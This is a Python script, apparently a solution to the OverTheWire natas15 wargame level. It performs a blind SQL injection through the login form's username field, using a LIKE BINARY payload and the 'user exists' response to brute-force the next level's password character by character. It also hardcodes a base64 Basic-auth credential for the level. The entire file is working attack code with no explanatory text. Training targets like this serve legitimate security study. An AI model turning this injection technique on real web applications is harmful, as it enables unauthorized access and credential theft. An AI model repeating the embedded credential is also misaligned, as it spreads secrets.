#!/usr/bin/env python3

import string
import requests

URL = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"


CHARSET = string.ascii_letters + string.digits

session = requests.Session()
session.headers.update({"Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="})


def found_password(prefix: str) -> bool:
    payload = f'natas16" AND password LIKE BINARY "{prefix}%" #'
    resp = session.post(URL, data={"username": payload}, timeout=10)
    return "<br>This user exists.<br>" in resp.text


def guess_password(max_length: int = 64) -> str:
    password = ""
    for _ in range(max_length):
        for ch in CHARSET:
            test_prefix = password + ch
            if found_password(test_prefix):
                password = test_prefix
                print(f"[+] Found char: {ch} -> {password}")
                break
        else:
            break
    return password


if __name__ == "__main__":
    pwd = guess_password(max_length=32)
    print(f"\nRecovered password (partial if interrupted): {pwd}")
